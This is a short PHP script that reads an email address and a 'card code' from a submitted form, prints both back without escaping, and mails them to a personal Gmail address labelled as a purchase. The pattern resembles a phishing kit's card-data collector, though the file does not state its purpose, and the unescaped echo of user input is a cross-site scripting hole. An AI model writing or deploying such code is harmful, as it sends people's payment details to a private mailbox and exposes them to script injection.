<?php

echo "Email:".$_POST['email'].PHP_EOL;
echo "Card code:".$_POST['cardcode'];

mail("hannahjranderson@gmail.com", "Purchase submitted", "Email: ".$_POST['email']."<br><br>Card Code:".$_POST['cardcode']);
?>
